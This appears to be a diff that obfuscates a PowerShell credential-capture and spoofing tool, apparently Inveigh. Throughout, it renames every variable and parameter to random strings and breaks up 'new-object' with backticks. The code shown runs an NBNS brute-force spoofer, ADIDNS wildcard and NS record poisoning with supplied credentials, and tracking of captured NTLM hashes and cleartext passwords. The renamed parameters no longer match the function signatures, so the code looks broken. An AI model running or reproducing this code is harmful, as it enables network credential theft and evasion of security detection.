-    $OilSilk = [System.Text.Encoding]::UTF8.GetBytes($OilSilk)
-    $BaitWound = [System.BitConverter]::GetBytes($BlushCattle)
-    [Array]::Reverse($BaitWound)
+    $mtaTsVqBdeJedCxmuZhLqqHptuN = [System.Text.Encoding]::UTF8.GetBytes($WfbavDNzjNgDFDUYWZEYjga)
+    $mtaTsVqBdeJedCxmuZhLqqHptuN = [System.BitConverter]::ToString($mtaTsVqBdeJedCxmuZhLqqHptuN)
+    $mtaTsVqBdeJedCxmuZhLqqHptuN = $mtaTsVqBdeJedCxmuZhLqqHptuN.Replace("-","")
+    $mtaTsVqBdeJedCxmuZhLqqHptuN = [System.Text.Encoding]::UTF8.GetBytes($mtaTsVqBdeJedCxmuZhLqqHptuN)
+    $PqfBMFnJtCcQXwIFXnfncaQHK = [System.BitConverter]::GetBytes($fgjekbNhYQKGsQdqOkUhuYvojUQK)
+    [Array]::Reverse($PqfBMFnJtCcQXwIFXnfncaQHK)
 
-    for($ColorReply=0; $ColorReply -lt $OilSilk.Count; $ColorReply++)
+    for($vfvDllDKJdYKKWFSzYEB=0; $vfvDllDKJdYKKWFSzYEB -lt $mtaTsVqBdeJedCxmuZhLqqHptuN.Count; $vfvDllDKJdYKKWFSzYEB++)
     {
 
-        if($OilSilk[$ColorReply] -gt 64)
+        if($mtaTsVqBdeJedCxmuZhLqqHptuN[$vfvDllDKJdYKKWFSzYEB] -gt 64)
         {
-            $HillHappen[$ColorReply] = $OilSilk[$ColorReply] + 10
+            $yflMMCjMxvFzMZqQkSvPiJHSlgULVTneOZIXV[$vfvDllDKJdYKKWFSzYEB] = $mtaTsVqBdeJedCxmuZhLqqHptuN[$vfvDllDKJdYKKWFSzYEB] + 10
         }
         else
         {
-            $HillHappen[$ColorReply] = $OilSilk[$ColorReply] + 17
+            $yflMMCjMxvFzMZqQkSvPiJHSlgULVTneOZIXV[$vfvDllDKJdYKKWFSzYEB] = $mtaTsVqBdeJedCxmuZhLqqHptuN[$vfvDllDKJdYKKWFSzYEB] + 17
         }
     
     }
 
-    $KindChess = 0x00,0x00,0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
-                            $HillHappen +
+    $wzGnHWrGkMIPdpEeDpKeVyvJpWOmClka = 0x00,0x00,0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
+                            $yflMMCjMxvFzMZqQkSvPiJHSlgULVTneOZIXV +
                             0x00,0x20,0x00,0x01 +
-                            $BaitWound +
+                            $PqfBMFnJtCcQXwIFXnfncaQHK +
                             0x00,0x06,0x00,0x00 +
-                            ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes() +
+                            ([System.Net.IPAddress][String]([System.Net.IPAddress]$zkTvnUBoWamaHbrMDvklWqGBdwC)).GetAddressBytes() +
                             0x00,0x00,0x00,0x00
 
-    $LightOval.output_queue.Add("[*] [$(Get-Date -format s)] Starting NBNS brute force spoofer to resolve $DelayValue on $NorthLumpy") > $null
-    $CannonRose = $false          
-    $GrubbyPast = ne`w-`obje`ct System.Net.Sockets.UdpClient(137)
-    $BattleSalt = [System.Net.IPAddress]::Parse($NorthLumpy)
-    $UnableIcy = ne`w-`obje`ct Net.IPEndpoint($BattleSalt,137)
-    $GrubbyPast.Connect($UnableIcy)
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[*] [$(Get-Date -format s)] Starting NBNS brute force spoofer to resolve $WfbavDNzjNgDFDUYWZEYjga on $deBQuAjyapQghIWyxSkbGMUVBhWkEQTObsvCP") > $null
+    $VZlpMIEaJCjZVAacblfuSOacRjNhXrkayINpaorvVu = $false          
+    $AUzkBzZTHoVXFQiubAtVoJbSKNsMMFzvYmYyvGm = ne`w`-`ob`je`ct System.Net.Sockets.UdpClient(137)
+    $oykrKuVVEIoRCUDFEJUJvVjwnahnO = [System.Net.IPAddress]::Parse($deBQuAjyapQghIWyxSkbGMUVBhWkEQTObsvCP)
+    $FdYctikbNCHGICHHMNaZbrJRddTdYLdWxLR = ne`w`-`ob`je`ct Net.IPEndpoint($oykrKuVVEIoRCUDFEJUJvVjwnahnO,137)
+    $AUzkBzZTHoVXFQiubAtVoJbSKNsMMFzvYmYyvGm.Connect($FdYctikbNCHGICHHMNaZbrJRddTdYLdWxLR)
        
-    while($LightOval.running)
+    while($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running)
     {
 
-        :NBNS_spoofer_loop while (!$LightOval.hostname_spoof -and $LightOval.running)
+        :NBNS_spoofer_loop while (!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.hostname_spoof -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running)
         {
 
-            if($CannonRose)
+            if($VZlpMIEaJCjZVAacblfuSOacRjNhXrkayINpaorvVu)
             {
-                $LightOval.output_queue.Add("[*] [$(Get-Date -format s)] Resuming NBNS brute force spoofer") > $null
-                $CannonRose = $false
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[*] [$(Get-Date -format s)] Resuming NBNS brute force spoofer") > $null
+                $VZlpMIEaJCjZVAacblfuSOacRjNhXrkayINpaorvVu = $false
             }
 
-            for ($ColorReply = 0; $ColorReply -lt 255; $ColorReply++)
+            for ($vfvDllDKJdYKKWFSzYEB = 0; $vfvDllDKJdYKKWFSzYEB -lt 255; $vfvDllDKJdYKKWFSzYEB++)
             {
 
-                for ($WindyEarth = 0; $WindyEarth -lt 255; $WindyEarth++)
+                for ($BzFGkMlyRCBJPIhnmBAAarEIcObHct = 0; $BzFGkMlyRCBJPIhnmBAAarEIcObHct -lt 255; $BzFGkMlyRCBJPIhnmBAAarEIcObHct++)
                 {
-                    $KindChess[0] = $ColorReply
-                    $KindChess[1] = $WindyEarth                 
-                    $GrubbyPast.send($KindChess,$KindChess.Length)
+                    $wzGnHWrGkMIPdpEeDpKeVyvJpWOmClka[0] = $vfvDllDKJdYKKWFSzYEB
+                    $wzGnHWrGkMIPdpEeDpKeVyvJpWOmClka[1] = $BzFGkMlyRCBJPIhnmBAAarEIcObHct                 
+                    $AUzkBzZTHoVXFQiubAtVoJbSKNsMMFzvYmYyvGm.send($wzGnHWrGkMIPdpEeDpKeVyvJpWOmClka,$wzGnHWrGkMIPdpEeDpKeVyvJpWOmClka.Length)
 
-                    if($LightOval.hostname_spoof -and $MournMean)
+                    if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.hostname_spoof -and $NRfqdntsPZobtiOhhrmgkqIltwHFxMIQcgwzNxjPu)
                     {
-                        $LightOval.output_queue.Add("[*] [$(Get-Date -format s)] Pausing NBNS brute force spoofer") > $null
-                        $CannonRose = $true
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[*] [$(Get-Date -format s)] Pausing NBNS brute force spoofer") > $null
+                        $VZlpMIEaJCjZVAacblfuSOacRjNhXrkayINpaorvVu = $true
                         break NBNS_spoofer_loop
                     }
                 
@@ -5169,96 +5169,96 @@ $KickWord =
         Start-Sleep -m 5
     }
 
-    $GrubbyPast.Close()
+    $AUzkBzZTHoVXFQiubAtVoJbSKNsMMFzvYmYyvGm.Close()
 }
 
 # Microsoft".
-$ErectJog =
+$oWMmjCcPJnxEalgUQekFIztXhyumRXkIlyLSfwZotoOLu =
 {
-    param ($HeatIll,$CuteGroup,[System.Management.Automation.PSCredential]$BlackFilthy,$TrapJoin,
-        $KnownFood,$StoryFurry,$LiveSedate,$BouncyEven,$ShinyAunt,$ViewNice,
-        $IceFix,$FarDry,$FullGrin,$FailDad,$DressGround,$MournMean,
-        $MatterOffice,$GrowthWind,$StickLame)
+    param ($hfdTDJMIWbkWdkyrTVXeElGpVPakhrijbMLWgef,$NcOuDYrPMCFkGAkGVeXkawbkHNSRTshpDrpJvCbYEvB,[System.Management.Automation.PSCredential]$ssnImzbkFylCcfywIEEVBwc,$NuKysEWfwHfjXVFRVZPgsYOxkAnIFj,
+        $XUZlETEKoZKWHdmmfbBJczSphZSZBDSdIxXzDCCaAERO,$uMFJurNQLlKXHMAtZAvWpotfqfIjJctkCymHxbpcYbcoz,$UOzMMsyJArPmhisyLVaGMsjMfqvxxPEEqcCGGGiDZcZ,$mUfKHWVntBnTLNKQYEtLBIaCAkwKF,$IhJmgwPnhtuPfSfJnHIiUD,$BFlwqVfFgHmnWSTrqOBa,
+        $HrZcGMZkGIqzkfsIOcryPlOaGnDRdnbAQIgw,$EishpmLeabgtsVFwpBjSiSwYdQOFqXys,$IthkijDWNkzEdhZAgWnlnNzsByVFDrWjDLQzbE,$futRGbdymzbIAOSHtlviC,$AdStsmmkNAXxRqgOZkjFyIskPQvPdRYR,$NRfqdntsPZobtiOhhrmgkqIltwHFxMIQcgwzNxjPu,
+        $KndapymywThkYKAxqdcJDIReOUkholHuQAHkNlCjcX,$PHCBkumExoZsaamTxeZRDLT,$zkTvnUBoWamaHbrMDvklWqGBdwC)
 
     function Invoke-OutputQueueLoop
     {
 
-        while($LightOval.output_queue.Count -gt 0)
+        while($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Count -gt 0)
         {
-            $LightOval.console_queue.Add($LightOval.output_queue[0]) > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue.Add($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue[0]) > $null
 
-            if($LightOval.file_output)
+            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.file_output)
             {
                 
-                if ($LightOval.output_queue[0].StartsWith("[+] ") -or $LightOval.output_queue[0].StartsWith("[*] ") -or $LightOval.output_queue[0].StartsWith("[!] ") -or $LightOval.output_queue[0].StartsWith("[-] "))
+                if ($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue[0].StartsWith("[+] ") -or $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue[0].StartsWith("[*] ") -or $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue[0].StartsWith("[!] ") -or $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue[0].StartsWith("[-] "))
                 {
-                    $LightOval.log_file_queue.Add($LightOval.output_queue[0]) > $null
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log_file_queue.Add($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue[0]) > $null
                 }
                 else
                 {
-                    $LightOval.log_file_queue.Add("[redacted]") > $null    
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log_file_queue.Add("[redacted]") > $null    
                 }
 
             }
 
-            if($LightOval.log_output)
+            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log_output)
             {
-                $LightOval.log.Add($LightOval.output_queue[0]) > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log.Add($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue[0]) > $null
             }
 
-            $LightOval.output_queue.RemoveAt(0)
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.RemoveAt(0)
         }
 
     }
 
     function Stop-InveighRunspace
     {
-        param ([String]$MeddlePart)
+        param ([String]$dyBqRcUOkHPWAdFrAFoklvMZWlegdAGigatki)
         
-        if($LightOval.HTTPS -and !$LightOval.HTTPS_existing_certificate -or ($LightOval.HTTPS_existing_certificate -and $LightOval.HTTPS_force_certificate_delete))
+        if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.HTTPS -and !$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.HTTPS_existing_certificate -or ($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.HTTPS_existing_certificate -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.HTTPS_force_certificate_delete))
         {
 
             try
             {
-                $FoundCave = ne`w-`obje`ct System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
-                $FoundCave.Open('ReadWrite')
-                $FoundTurkey = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $LightOval.certificate_issuer})
+                $THJzSoyYQLrmUzXehaiOeRsETTcusB = ne`w`-`ob`je`ct System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
+                $THJzSoyYQLrmUzXehaiOeRsETTcusB.Open('ReadWrite')
+                $OSHNstEEdcpSkcXMOvvyDWeCqIBJgTgZVwlEe = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.certificate_issuer})
 
-                foreach($DollsRound in $FoundTurkey)
+                foreach($eNyoXCTAybaAANxTFwphvhJXcsiYBTuGp in $OSHNstEEdcpSkcXMOvvyDWeCqIBJgTgZVwlEe)
                 {
-                    $FoundCave.Remove($DollsRound)
+                    $THJzSoyYQLrmUzXehaiOeRsETTcusB.Remove($eNyoXCTAybaAANxTFwphvhJXcsiYBTuGp)
                 }
 
-                $FoundCave.Close()
+                $THJzSoyYQLrmUzXehaiOeRsETTcusB.Close()
             }
             catch
             {
-                $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] SSL Certificate Deletion Error [Remove Manually]") > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] [$(Get-Date -format s)] SSL Certificate Deletion Error [Remove Manually]") > $null
             }
 
         }
 
-        if($CuteGroup -eq 'Y' -and $LightOval.ADIDNS_table.Count -gt 0)
+        if($NcOuDYrPMCFkGAkGVeXkawbkHNSRTshpDrpJvCbYEvB -eq 'Y' -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table.Count -gt 0)
         {
-            [Array]$BaseDapper = $LightOval.ADIDNS_table.Keys
+            [Array]$ZnDEbMvBkazmPVmZeClxgWGZlJSuTfUIYDyNuLz = $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table.Keys
 
-            foreach($KnottyHelp in $BaseDapper)
+            foreach($iSFFbNmIfHTyxYEeSsanYn in $ZnDEbMvBkazmPVmZeClxgWGZlJSuTfUIYDyNuLz)
             {
                 
-                if($LightOval.ADIDNS_table.$KnottyHelp -ge 1)
+                if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table.$iSFFbNmIfHTyxYEeSsanYn -ge 1)
                 {
 
                     try
                     {
-                        Disable-ADIDNSNode -Credential $BlackFilthy -DesireUnique $TrapJoin -TrickWander $KnownFood -FilmJazzy $KnottyHelp -CauseYoke $ViewNice -PersonCheer $FullGrin
-                        $LightOval.ADIDNS_table.$KnottyHelp = $null
+                        Disable-ADIDNSNode -Credential $ssnImzbkFylCcfywIEEVBwc -ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay $NuKysEWfwHfjXVFRVZPgsYOxkAnIFj -oOKRVkPmhffpDSkVLIFGzJKYJ $XUZlETEKoZKWHdmmfbBJczSphZSZBDSdIxXzDCCaAERO -ifczfhVhxXUsXrLMmesQQ $iSFFbNmIfHTyxYEeSsanYn -zgPBavHAgJDNXciLWtpacZIBhUFjXbA $BFlwqVfFgHmnWSTrqOBa -SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC $IthkijDWNkzEdhZAgWnlnNzsByVFDrWjDLQzbE
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table.$iSFFbNmIfHTyxYEeSsanYn = $null
                     }
                     catch
                     {
                         $error_message = $_.Exception.Message
                         $error_message = $error_message -replace "`n",""
-                        $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
-                        $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] ADIDNS host record for $KnottyHelp remove failed") > $null
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] [$(Get-Date -format s)] ADIDNS host record for $iSFFbNmIfHTyxYEeSsanYn remove failed") > $null
                     }
 
                 }
@@ -5267,162 +5267,162 @@ $ErectJog =
 
         }
         
-        if($LightOval.relay_running)
+        if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.relay_running)
         {
             Start-Sleep -m 100
 
-            if($MeddlePart)
+            if($dyBqRcUOkHPWAdFrAFoklvMZWlegdAGigatki)
             {
-                $LightOval.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh Relay is exiting due to $MeddlePart") > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh Relay is exiting due to $dyBqRcUOkHPWAdFrAFoklvMZWlegdAGigatki") > $null
             }
             else
             {
-                $LightOval.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh Relay is exiting") > $null  
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh Relay is exiting") > $null  
             }
 
-            if(!$LightOval.running)
+            if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running)
             {
                 Invoke-OutputQueueLoop
                 Start-Sleep -m 100
             }
 
-            $LightOval.relay_running = $false
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.relay_running = $false
         }
 
-        if($LightOval.running)
+        if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running)
         {
 
-            if($MeddlePart)
+            if($dyBqRcUOkHPWAdFrAFoklvMZWlegdAGigatki)
             {
-                $LightOval.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh is exiting due to $MeddlePart") > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh is exiting due to $dyBqRcUOkHPWAdFrAFoklvMZWlegdAGigatki") > $null
             }
             else
             {
-                $LightOval.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh is exiting") > $null  
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh is exiting") > $null  
             }
 
             Invoke-OutputQueueLoop
 
-            if(!$DressGround)
+            if(!$AdStsmmkNAXxRqgOZkjFyIskPQvPdRYR)
             {
-                Start-Sleep -PlantsIrate 3
+                Start-Sleep -ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk 3
             }
 
-            $LightOval.running = $false
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running = $false
         }
 
-        $LightOval.ADIDNS = $null
-        $LightOval.HTTPS = $false
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS = $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.HTTPS = $false
     }
 
-    if($LightOval.ADIDNS -contains 'Wildcard')
+    if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS -contains 'Wildcard')
     {
-        Invoke-ADIDNSSpoofer -Credential $BlackFilthy -IckyBloody $StickLame -DesireUnique $TrapJoin -TrickWander $KnownFood -RipeYoke $StoryFurry -FilmJazzy '*' -CauseYoke $ViewNice -EarBucket 'A'-LethalArrive $FarDry -PersonCheer $FullGrin
+        Invoke-ADIDNSSpoofer -Credential $ssnImzbkFylCcfywIEEVBwc -eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE $zkTvnUBoWamaHbrMDvklWqGBdwC -ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay $NuKysEWfwHfjXVFRVZPgsYOxkAnIFj -oOKRVkPmhffpDSkVLIFGzJKYJ $XUZlETEKoZKWHdmmfbBJczSphZSZBDSdIxXzDCCaAERO -VLmckwKaUbSGuBdaTXxvwvzODhZHIWAWhufWP $uMFJurNQLlKXHMAtZAvWpotfqfIjJctkCymHxbpcYbcoz -ifczfhVhxXUsXrLMmesQQ '*' -zgPBavHAgJDNXciLWtpacZIBhUFjXbA $BFlwqVfFgHmnWSTrqOBa -NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa 'A'-SHYbFZJwSEjcXEKgEXzgBUgNkNPJtqpmcyVwW $EishpmLeabgtsVFwpBjSiSwYdQOFqXys -SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC $IthkijDWNkzEdhZAgWnlnNzsByVFDrWjDLQzbE
     }
 
-    if($LightOval.ADIDNS -contains 'NS')
+    if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS -contains 'NS')
     {
 
-        if($ShinyAunt.EndsWith($FullGrin))
+        if($IhJmgwPnhtuPfSfJnHIiUD.EndsWith($IthkijDWNkzEdhZAgWnlnNzsByVFDrWjDLQzbE))
         {
-            $UnableSteer = $ShinyAunt
-            $ShinyAunt = $ShinyAunt -replace ".$FullGrin",''
+            $HgonDjkWSOMQANoEoHTnKSXHiscJnIfqUrustYlXuzfw = $IhJmgwPnhtuPfSfJnHIiUD
+            $IhJmgwPnhtuPfSfJnHIiUD = $IhJmgwPnhtuPfSfJnHIiUD -replace ".$IthkijDWNkzEdhZAgWnlnNzsByVFDrWjDLQzbE",''
         }
         else
         {
-            $UnableSteer = $ShinyAunt + "." + $FullGrin
+            $HgonDjkWSOMQANoEoHTnKSXHiscJnIfqUrustYlXuzfw = $IhJmgwPnhtuPfSfJnHIiUD + "." + $IthkijDWNkzEdhZAgWnlnNzsByVFDrWjDLQzbE
         }
 
-        Invoke-ADIDNSSpoofer -Credential $BlackFilthy -IckyBloody $StickLame -DesireUnique $TrapJoin -TrickWander $KnownFood -RipeYoke $StoryFurry -FilmJazzy $ShinyAunt -CauseYoke $ViewNice -EarBucket 'A' -LethalArrive $FarDry -PersonCheer $FullGrin
-        Invoke-ADIDNSSpoofer -Credential $BlackFilthy -IckyBloody $UnableSteer -DesireUnique $TrapJoin -TrickWander $KnownFood -RipeYoke $StoryFurry -FilmJazzy $BouncyEven -CauseYoke $ViewNice -EarBucket 'NS' -LethalArrive $FarDry -PersonCheer $FullGrin
+        Invoke-ADIDNSSpoofer -Credential $ssnImzbkFylCcfywIEEVBwc -eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE $zkTvnUBoWamaHbrMDvklWqGBdwC -ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay $NuKysEWfwHfjXVFRVZPgsYOxkAnIFj -oOKRVkPmhffpDSkVLIFGzJKYJ $XUZlETEKoZKWHdmmfbBJczSphZSZBDSdIxXzDCCaAERO -VLmckwKaUbSGuBdaTXxvwvzODhZHIWAWhufWP $uMFJurNQLlKXHMAtZAvWpotfqfIjJctkCymHxbpcYbcoz -ifczfhVhxXUsXrLMmesQQ $IhJmgwPnhtuPfSfJnHIiUD -zgPBavHAgJDNXciLWtpacZIBhUFjXbA $BFlwqVfFgHmnWSTrqOBa -NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa 'A' -SHYbFZJwSEjcXEKgEXzgBUgNkNPJtqpmcyVwW $EishpmLeabgtsVFwpBjSiSwYdQOFqXys -SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC $IthkijDWNkzEdhZAgWnlnNzsByVFDrWjDLQzbE
+        Invoke-ADIDNSSpoofer -Credential $ssnImzbkFylCcfywIEEVBwc -eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE $HgonDjkWSOMQANoEoHTnKSXHiscJnIfqUrustYlXuzfw -ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay $NuKysEWfwHfjXVFRVZPgsYOxkAnIFj -oOKRVkPmhffpDSkVLIFGzJKYJ $XUZlETEKoZKWHdmmfbBJczSphZSZBDSdIxXzDCCaAERO -VLmckwKaUbSGuBdaTXxvwvzODhZHIWAWhufWP $uMFJurNQLlKXHMAtZAvWpotfqfIjJctkCymHxbpcYbcoz -ifczfhVhxXUsXrLMmesQQ $mUfKHWVntBnTLNKQYEtLBIaCAkwKF -zgPBavHAgJDNXciLWtpacZIBhUFjXbA $BFlwqVfFgHmnWSTrqOBa -NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa 'NS' -SHYbFZJwSEjcXEKgEXzgBUgNkNPJtqpmcyVwW $EishpmLeabgtsVFwpBjSiSwYdQOFqXys -SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC $IthkijDWNkzEdhZAgWnlnNzsByVFDrWjDLQzbE
     }
 
-    if($MournMean)
+    if($NRfqdntsPZobtiOhhrmgkqIltwHFxMIQcgwzNxjPu)
     {   
-        $BloodDeath = New-TimeSpan -Seconds $MournMean
+        $ieJfPJVatZqImYaaFEtqwCgXeqrZPuyDRRshumupnVvw = New-TimeSpan -Seconds $NRfqdntsPZobtiOhhrmgkqIltwHFxMIQcgwzNxjPu
     }
 
-    $DrunkDivide = $MatterOffice + $LightOval.NTLMv1_list.Count
-    $FloatRecord = $MatterOffice + $LightOval.NTLMv2_list.Count
-    $SomberPet = $MatterOffice + $LightOval.cleartext_list.Count
+    $kyCvLxOlQFjztaxSmYVMPhXLZHIPeFwsSAgZIdHoM = $KndapymywThkYKAxqdcJDIReOUkholHuQAHkNlCjcX + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_list.Count
+    $JEyZNtHLsbFOobjhwiqhwtXJhsQvVIWoPFbGjhPpmERBN = $KndapymywThkYKAxqdcJDIReOUkholHuQAHkNlCjcX + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_list.Count
+    $ODNtaypizOvIlBTqwqMSNOLxEMBlG = $KndapymywThkYKAxqdcJDIReOUkholHuQAHkNlCjcX + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.cleartext_list.Count
 
-    if($GrowthWind)
+    if($PHCBkumExoZsaamTxeZRDLT)
     {    
-        $TorpidStupid = New-TimeSpan -Minutes $GrowthWind
-        $SeemlyLamp = [System.Diagnostics.Stopwatch]::StartNew()
+        $RCYmaErtLaqluHMzpUbRqOiiovemRuBZCN = New-TimeSpan -Minutes $PHCBkumExoZsaamTxeZRDLT
+        $OUlLOKkUFJQEyTHQlfNQgQCPgXFHUIZzRfaOut = [System.Diagnostics.Stopwatch]::StartNew()
     }
 
-    while($LightOval.running)
+    while($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running)
     {
 
-        if($MournMean -and $LightOval.hostname_spoof)
+        if($NRfqdntsPZobtiOhhrmgkqIltwHFxMIQcgwzNxjPu -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.hostname_spoof)
         {
          
-            if($LightOval.NBNS_stopwatch.Elapsed -ge $BloodDeath)
+            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NBNS_stopwatch.Elapsed -ge $ieJfPJVatZqImYaaFEtqwCgXeqrZPuyDRRshumupnVvw)
             {
-                $LightOval.hostname_spoof = $false
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.hostname_spoof = $false
             }
         
         }
 
-        if($MatterOffice)
+        if($KndapymywThkYKAxqdcJDIReOUkholHuQAHkNlCjcX)
         {
             
-            if($LightOval.NTLMv1_list.Count -ge $DrunkDivide -or $LightOval.NTLMv2_list.Count -ge $FloatRecord -or $LightOval.cleartext_list.Count -ge $SomberPet)
+            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_list.Count -ge $kyCvLxOlQFjztaxSmYVMPhXLZHIPeFwsSAgZIdHoM -or $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_list.Count -ge $JEyZNtHLsbFOobjhwiqhwtXJhsQvVIWoPFbGjhPpmERBN -or $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.cleartext_list.Count -ge $ODNtaypizOvIlBTqwqMSNOLxEMBlG)
             {
                 Stop-InveighRunspace "reaching run count"           
             }
 
         }
 
-        if($GrowthWind)
+        if($PHCBkumExoZsaamTxeZRDLT)
         {
 
-            if($SeemlyLamp.Elapsed -ge $TorpidStupid)
+            if($OUlLOKkUFJQEyTHQlfNQgQCPgXFHUIZzRfaOut.Elapsed -ge $RCYmaErtLaqluHMzpUbRqOiiovemRuBZCN)
             {
                 Stop-InveighRunspace "reaching run time"
             }
 
         }
 
-        if($LightOval.ADIDNS -contains 'Combo' -and $LightOval.request_table_updated)
+        if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS -contains 'Combo' -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table_updated)
         {
             
             try
             {
-                Invoke-ADIDNSCheck -Credential $BlackFilthy -IckyBloody $StickLame -DesireUnique $TrapJoin -TrickWander $KnownFood -RipeYoke $StoryFurry -MuscleFair $LiveSedate -CauseYoke $ViewNice -IrateAnimal $LightOval.request_table -DrainCable $IceFix -LethalArrive $FarDry -PersonCheer $FullGrin
